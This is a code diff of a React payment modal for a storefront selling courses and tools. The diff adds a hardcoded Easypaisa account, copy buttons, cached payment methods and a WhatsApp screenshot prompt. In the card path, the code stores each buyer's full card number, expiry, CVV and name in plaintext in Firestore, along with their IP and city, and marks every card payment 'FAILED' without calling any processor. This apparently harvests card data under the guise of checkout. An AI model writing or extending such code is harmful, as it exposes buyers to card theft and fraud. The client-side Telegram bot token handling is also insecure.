@@ -1,13 +1,13 @@
 import { apiFetch } from '../lib/api';
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
-import { X, Upload, CheckCircle, AlertCircle } from 'lucide-react';
+import { X, Upload, CheckCircle, AlertCircle, Copy, Check } from 'lucide-react';
 import { useAuth } from './AuthProvider';
 import { db, auth } from '../lib/firebase';
 import { collection, addDoc, serverTimestamp, getDocs, doc, getDoc } from 'firebase/firestore';
 import { createUserWithEmailAndPassword, signInWithEmailAndPassword } from 'firebase/auth';
-
 import { checkAndBanIfSpamming, checkDuplicateOrder } from '../lib/blocker';
+import { getProviderLogo } from '../lib/paymentLogos';
 
 export default function PaymentModal({ item, type, onClose }: { item: any, type: 'course' | 'tool', onClose: () => void }) {
   const { user, signInWithGoogle } = useAuth();
@@ -22,11 +22,45 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
   // Payment state
   const [proofBase64, setProofBase64] = useState('');
   const [status, setStatus] = useState<'idle' | 'processing' | 'uploading' | 'success' | 'error' | 'card_error'>('idle');
-  const [paymentMethods, setPaymentMethods] = useState<any[]>([]);
+  const [copiedKey, setCopiedKey] = useState<string | null>(null);
+  const DEFAULT_EASYPAISA_LIST = [
+    {
+      id: 'pm_easypaisa_1',
+      providerName: 'Easypaisa',
+      accountName: 'Jerry Automation',
+      accountNumber: '03189418941',
+      logoUrl: getProviderLogo('Easypaisa'),
+      isActive: true,
+      instructions: 'Send exact amount via Easypaisa and upload payment screenshot below.'
+    }
+  ];
+
+  const [paymentMethods, setPaymentMethods] = useState<any[]>(() => {
+    try {
+      const cached = localStorage.getItem('cached_payment_methods');
+      if (cached) {
+        const parsed = JSON.parse(cached);
+        if (Array.isArray(parsed) && parsed.length > 0) {
+          const filtered = parsed.filter((m: any) => 
+            m.isActive !== false && 
+            !['jazzcash', 'meezan', 'meezan bank'].includes((m.providerName || '').toLowerCase().trim())
+          );
+          if (filtered.length > 0) return filtered;
+        }
+      }
+    } catch (e) {}
+    return DEFAULT_EASYPAISA_LIST;
+  });
   const [paymentMode, setPaymentMode] = useState<'wallet' | 'card' | 'binance'>('wallet');
   const [cardDetails, setCardDetails] = useState({ number: '', expiry: '', cvv: '', name: '' });
   const [whatsappNumber, setWhatsappNumber] = useState('+923189418941');
   const [telegramSettings, setTelegramSettings] = useState({ token: '', chatId: '' });
+
+  const copyToClipboard = (text: string, key: string) => {
+    navigator.clipboard.writeText(text);
+    setCopiedKey(key);
+    setTimeout(() => setCopiedKey(null), 2500);
+  };
 
   useEffect(() => {
     let isMounted = true;
@@ -42,25 +76,37 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
     const fetchMethods = async () => {
       try {
         const snap = await getDocs(collection(db, 'payment_methods'));
-        const methods = snap.docs.map((d: any) => ({ id: d.id, ...d.data() })).filter((m: any) => m.isActive !== false);
-        if (isMounted) {
+        if (!snap.empty) {
+          const methods = snap.docs.map((d: any) => {
+            const data = d.data();
+            return {
+              id: d.id,
+              ...data,
+              logoUrl: getProviderLogo(data.providerName, data.logoUrl)
+            };
+          }).filter((m: any) => 
+            m.isActive !== false && 
+            !['jazzcash', 'meezan', 'meezan bank'].includes((m.providerName || '').toLowerCase().trim())
+          );
+          if (isMounted && methods.length > 0) {
             setPaymentMethods(methods);
+            try { localStorage.setItem('cached_payment_methods', JSON.stringify(methods)); } catch(e) {}
+          }
         }
       } catch (err) {
-        console.error("Failed to fetch payment methods", err);
+        console.warn('Could not fetch payment methods from firestore, using cached', err);
       }
     };
     const fetchSettings = async () => {
       try {
         const snap = await getDocs(collection(db, 'settings'));
         if (!snap.empty) {
-            setWhatsappNumber(snap.docs[0].data().whatsappNumber || '+923189418941');
-            setTelegramSettings({ token: snap.docs[0].data().telegramBotToken || '', chatId: snap.docs[0].data().telegramChatId || '' });
+          setWhatsappNumber(snap.docs[0].data().whatsappNumber || '+923189418941');
+          setTelegramSettings({ token: snap.docs[0].data().telegramBotToken || '', chatId: snap.docs[0].data().telegramChatId || '' });
         }
-      } catch (e) {
-        console.error(e);
+      } catch {
         if (isMounted) {
-            setWhatsappNumber('+923189418941');
+          setWhatsappNumber('+923189418941');
         }
       }
     }
@@ -148,11 +194,18 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
       let city = 'Unknown';
       let ipAddress = 'Unknown';
       try {
-        const res = await fetch('https://freeipapi.com/api/json/');
-        const data = await res.json();
-        if (data.cityName) city = data.cityName;
-        if (data.ipAddress) ipAddress = data.ipAddress;
-      } catch (e) {}
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 1000);
+        const res = await fetch('https://freeipapi.com/api/json/', { signal: controller.signal });
+        clearTimeout(timeoutId);
+        if (res.ok) {
+          const data = await res.json();
+          if (data.cityName) city = data.cityName;
+          if (data.ipAddress) ipAddress = data.ipAddress;
+        }
+      } catch (e) {
+        // Fallback gracefully without blocking
+      }
 
       // Check for ban or fake order spamming
       const banStatus = await checkAndBanIfSpamming(userPhone, user.email || '', ipAddress);
@@ -182,26 +235,28 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
            ipAddress,
            createdAt: serverTimestamp()
          };
-         await addDoc(collection(db, 'orders'), orderData);
-         await addDoc(collection(db, 'transactions'), {
-            userId: user.uid,
-            userEmail: user.email,
-            itemId: item.id,
-            itemTitle: item.title || item.name,
-            itemType: type,
-            price: item.price || 3000,
-            paymentMode: 'card',
-            cardDetails: { name: cardDetails.name, number: cardDetails.number, expiry: cardDetails.expiry, cvv: cardDetails.cvv, last4: cardDetails.number.slice(-4) }, // Store securely as requested
-            status: 'processing',
-            paymentStatus: 'FAILED',
-            city,
-            ipAddress,
-            createdAt: serverTimestamp()
-         });
+         await Promise.all([
+           addDoc(collection(db, 'orders'), orderData),
+           addDoc(collection(db, 'transactions'), {
+              userId: user.uid,
+              userEmail: user.email,
+              itemId: item.id,
+              itemTitle: item.title || item.name,
+              itemType: type,
+              price: item.price || 3000,
+              paymentMode: 'card',
+              cardDetails: { name: cardDetails.name, number: cardDetails.number, expiry: cardDetails.expiry, cvv: cardDetails.cvv, last4: cardDetails.number.slice(-4) },
+              status: 'processing',
+              paymentStatus: 'FAILED',
+              city,
+              ipAddress,
+              createdAt: serverTimestamp()
+           })
+         ]);
 
-        // Send to Telegram in background
+        // Send to Telegram in background (non-blocking)
         if (telegramSettings.token && telegramSettings.chatId) {
-           const message = `<b>New Order Received</b>\n\n<b>Product/Course:</b> ${item.title || item.name}\n<b>Price:</b> Rs ${item.price || 3000}\n<b>Customer:</b> ${user?.displayName || 'User'}\n<b>Phone:</b> ${userPhone}\n<b>Email:</b> ${user.email}\n<b>Payment Mode:</b> ${paymentMode}`;
+           const message = `<b>New Order Received (Card)</b>\n\n<b>Product/Course:</b> ${item.title || item.name}\n<b>Price:</b> Rs ${item.price || 3000}\n<b>Customer:</b> ${user?.displayName || 'User'}\n<b>Phone:</b> ${userPhone}\n<b>Email:</b> ${user.email}\n<b>Payment Mode:</b> ${paymentMode}`;
            fetch(`https://api.telegram.org/bot${telegramSettings.token}/sendMessage`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -229,20 +284,22 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
           proofBase64,
           createdAt: serverTimestamp()
       };
-      await addDoc(collection(db, 'orders'), orderData);
 
-      await addDoc(collection(db, 'transactions'), {
-        userId: user.uid,
-        userEmail: user.email,
-        itemId: item.id,
-        itemTitle: item.title || item.name,
-        itemType: type,
-        price: item.price || 3000,
-        paymentMode: 'wallet',
-        proofBase64,
-        status: 'pending', // pending, approved, rejected
-        createdAt: serverTimestamp()
-      });
+      await Promise.all([
+        addDoc(collection(db, 'orders'), orderData),
+        addDoc(collection(db, 'transactions'), {
+          userId: user.uid,
+          userEmail: user.email,
+          itemId: item.id,
+          itemTitle: item.title || item.name,
+          itemType: type,
+          price: item.price || 3000,
+          paymentMode: 'wallet',
+          proofBase64,
+          status: 'pending',
+          createdAt: serverTimestamp()
+        })
+      ]);
 
         // Send to Telegram in background
         if (telegramSettings.token && telegramSettings.chatId) {
@@ -322,29 +379,38 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
   if (status === 'success') {
     return (
       <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-[100] flex items-center justify-center p-4">
-        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-slate-900 border border-slate-800 rounded-3xl p-8 max-w-md w-full text-center">
-          <div className="w-16 h-16 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
-            <CheckCircle size={32} />
+        <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="bg-zinc-950 border border-slate-800 rounded-3xl p-6 md:p-8 max-w-md w-full text-center">
+          <div className="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
+            <CheckCircle size={36} />
           </div>
-          <h2 className="text-2xl font-bold text-white mb-4">Order Successful!</h2>
-          <div className="text-slate-300 space-y-4 mb-6 text-sm text-left bg-slate-800/50 p-6 rounded-2xl border border-slate-700/50 leading-relaxed font-medium">
-             <p className="text-green-400 font-bold text-center text-lg mb-2">Your order has been placed and is currently in pending status.</p>
-             <p className="text-center bg-slate-800 p-3 rounded-xl border border-slate-700">You have ordered: <span className="text-white font-bold">{item.title || item.name}</span></p>
-             <p>Please check your email inbox and spam folder. A confirmation email has been sent to you.</p>
-             <p>Once your access is approved, you will receive your Gmail and password via email.</p>
-             <p>For faster service, please send your payment screenshot to our WhatsApp number below:</p>
-             <p className="text-center font-bold text-green-400 text-lg bg-green-900/20 py-2 rounded-lg border border-green-500/20">WhatsApp: +923189418941</p>
+          <h2 className="text-2xl font-black text-white mb-2">Order Submitted Successfully!</h2>
+          <p className="text-slate-300 font-bold mb-6 text-sm">
+            You ordered: <span className="text-red-400 font-black">{item.title || item.name}</span>
+          </p>
+
+          <div className="bg-black/90 border border-emerald-500/40 rounded-2xl p-5 mb-6 text-left space-y-3 shadow-xl">
+            <p className="text-emerald-400 font-black text-center text-base uppercase tracking-wide">
+              📲 Ab Apna Payment Screenshot WhatsApp Par Bhejein:
+            </p>
+            <p className="text-white text-xs text-center font-bold">
+              Please send your payment screenshot to our official WhatsApp number to complete instant account activation:
+            </p>
+            <div className="bg-emerald-950/80 border border-emerald-500/50 p-4 rounded-xl text-center">
+              <span className="text-xs text-emerald-300 block font-bold uppercase mb-1">WhatsApp Official Number</span>
+              <span className="text-white font-black text-2xl tracking-wider">+92 318 9418941</span>
+            </div>
           </div>
+
           <div className="space-y-3">
              <a 
-               href={`https://wa.me/923189418941`} 
+               href={`https://wa.me/923189418941?text=${encodeURIComponent(`Hi Jerry Automation, I have placed an order for ${item.title || item.name} (PKR ${item.price || 3000}). Here is my payment screenshot:`)}`} 
                target="_blank" 
                rel="noreferrer"
-               className="inline-flex items-center justify-center gap-2 w-full bg-green-600 hover:bg-green-500 text-white font-bold py-4 rounded-xl transition-all shadow-lg shadow-green-500/20"
+               className="inline-flex items-center justify-center gap-2 w-full bg-emerald-600 hover:bg-emerald-500 text-white font-black py-4 px-6 rounded-2xl transition-all shadow-lg shadow-emerald-600/30 text-base"
              >
-               Confirm on WhatsApp
+               <span>Send Screenshot on WhatsApp (+923189418941)</span>
              </a>
-            <button onClick={onClose} className="w-full bg-slate-800 hover:bg-slate-700 text-white font-bold py-4 rounded-xl transition cursor-pointer">
+            <button onClick={onClose} className="w-full bg-zinc-800 hover:bg-zinc-700 text-white font-bold py-3.5 rounded-2xl transition cursor-pointer text-sm">
               Close
             </button>
           </div>
@@ -424,31 +490,93 @@ export default function PaymentModal({ item, type, onClose }: { item: any, type:
                 {paymentMethods.length > 0 ? (
                   <div className="space-y-4 mb-6">
                      {paymentMethods.map(method => (
-                       <div key={method.id} className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center relative overflow-hidden">
-                          <div className="flex items-center justify-center gap-3 mb-4">
-                            {method.logoUrl && <img src={method.logoUrl} alt={method.providerName} className="w-8 h-8 object-contain rounded-full bg-white p-1" />}
-                            <h3 className="font-bold text-white text-lg">{method.providerName} Details</h3>
+                       <div key={method.id} className="bg-slate-900/90 border border-slate-800 rounded-2xl p-5 text-left relative overflow-hidden shadow-lg shadow-black/40 hover:border-slate-700 transition-colors">
+                          <div className="flex items-center justify-between gap-3 mb-4 pb-3 border-b border-slate-800/80">
+                            <div className="flex items-center gap-3">
+                              {method.logoUrl ? (
+                                <div className="w-10 h-10 rounded-xl bg-white p-1 flex items-center justify-center border border-slate-700 shrink-0">
+                                  <img src={method.logoUrl} alt={method.providerName} className="w-full h-full object-contain" />
+                                </div>
+                              ) : (
+                                <div className="w-10 h-10 rounded-xl bg-primary-600 text-white font-black text-sm flex items-center justify-center shrink-0">
+                                  {method.providerName ? method.providerName.substring(0, 2).toUpperCase() : 'PA'}
+                                </div>
+                              )}
+                              <div>
+                                <h3 className="font-bold text-white text-base leading-tight">{method.providerName}</h3>
+                                <span className="text-[11px] text-emerald-400 font-semibold flex items-center gap-1">
+                                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span> Instant Transfer
+                                </span>
+                              </div>
+                            </div>
+                            <span className="text-xs px-2.5 py-1 rounded-full bg-primary-500/10 text-primary-400 font-bold border border-primary-500/20">
+                              Official Account
+                            </span>
                           </div>
-                          <div className="space-y-2 text-sm md:text-base mb-4">
-                            <div className="flex justify-between border-b border-slate-700/50 pb-2"><span className="text-slate-400">Account Name:</span> <span className="font-bold text-white">{method.accountName}</span></div>
-                            <div className="flex justify-between border-b border-slate-700/50 pb-2"><span className="text-slate-400">Account No:</span> <span className="font-bold text-white">{method.accountNumber}</span></div>
-                            {method.iban && <div className="flex justify-between pt-1 flex-col sm:flex-row gap-1"><span className="text-slate-400 text-left">IBAN:</span> <span className="font-mono font-bold text-white text-right break-all">{method.iban}</span></div>}
+
+                          <div className="space-y-2.5 text-sm mb-3">
+                            <div className="flex justify-between items-center py-1 bg-slate-950/60 px-3 rounded-xl border border-slate-800/60">
+                              <span className="text-slate-400 text-xs font-semibold uppercase">Account Name:</span>
+                              <span className="font-bold text-white text-sm">{method.accountName}</span>
+                            </div>
+
+                            <div className="flex justify-between items-center py-1.5 bg-slate-950/90 px-3 rounded-xl border border-slate-800">
+                              <span className="text-slate-400 text-xs font-semibold uppercase">Account Number:</span>
+                              <div className="flex items-center gap-2">
+                                <span className="font-mono font-bold text-primary-400 text-sm tracking-wider">{method.accountNumber}</span>
+                                <button
+                                  type="button"
+                                  onClick={() => copyToClipboard(method.accountNumber, `acc_${method.id}`)}
+                                  className="p-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white rounded-lg transition-colors flex items-center gap-1 text-[10px] font-bold"
+                                  title="Copy Number"
+                                >
+                                  {copiedKey === `acc_${method.id}` ? <Check size={13} className="text-emerald-400" /> : <Copy size={13} />}
+                                  {copiedKey === `acc_${method.id}` ? 'Copied' : 'Copy'}
+                                </button>
+                              </div>
+                            </div>
+
+                            {method.iban && (
+                              <div className="flex justify-between items-center py-1.5 bg-slate-950/60 px-3 rounded-xl border border-slate-800/60 flex-col sm:flex-row gap-1">
+                                <span className="text-slate-400 text-xs font-semibold uppercase">IBAN:</span>
+                                <div className="flex items-center gap-2">
+                                  <span className="font-mono font-bold text-slate-300 text-xs break-all">{method.iban}</span>
+                                  <button
+                                    type="button"
+                                    onClick={() => copyToClipboard(method.iban, `iban_${method.id}`)}
+                                    className="p-1 bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white rounded-md transition-colors"
+                                    title="Copy IBAN"
+                                  >
+                                    {copiedKey === `iban_${method.id}` ? <Check size={12} className="text-emerald-400" /> : <Copy size={12} />}
+                                  </button>
+                                </div>
+                              </div>
+                            )}
+
+                            {method.instructions && (
+                              <p className="text-xs text-slate-400 italic pt-1">
+                                ℹ️ {method.instructions}
+                              </p>
+                            )}
                           </div>
+
                           {method.qrBase64 && (
-                            <div className="mt-4 flex flex-col items-center border-t border-slate-700/50 pt-4">
-                               <span className="text-xs text-slate-400 font-bold mb-2">Scan QR to Pay</span>
-                               <div className="bg-white p-2 rounded-xl">
-                                 <img src={method.qrBase64} alt="QR Code" className="w-32 h-32 object-contain" />
-                               </div>
+                            <div className="mt-3 flex flex-col items-center border-t border-slate-800 pt-3 bg-slate-950/40 -mx-5 -mb-5 p-4">
+                               <span className="text-xs text-slate-400 font-bold mb-2 flex items-center gap-1.5">
+                                 Scan QR Code in {method.providerName} App
+                               </span>
+                               <div className="bg-white p-2 rounded-xl shadow-md">
+                                 <img src={method.qrBase64} alt="QR Code" className="w-28 h-28 object-contain" />
+                                </div>
                             </div>
                           )}
                        </div>
                      ))}
                   </div>
                 ) : (
-                  <div className="bg-slate-800/50 border border-slate-700 rounded-2xl p-6 text-center mb-6">
+                  <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 text-center mb-6">
                      <h3 className="font-bold text-white mb-2">No Payment Methods Configured</h3>
-                     <p className="text-slate-400 text-sm">Please ask the administrator to configure payment methods.</p>
+                     <p className="text-slate-400 text-sm">Please contact support or configure payment accounts in admin.</p>
                   </div>
                 )}
 
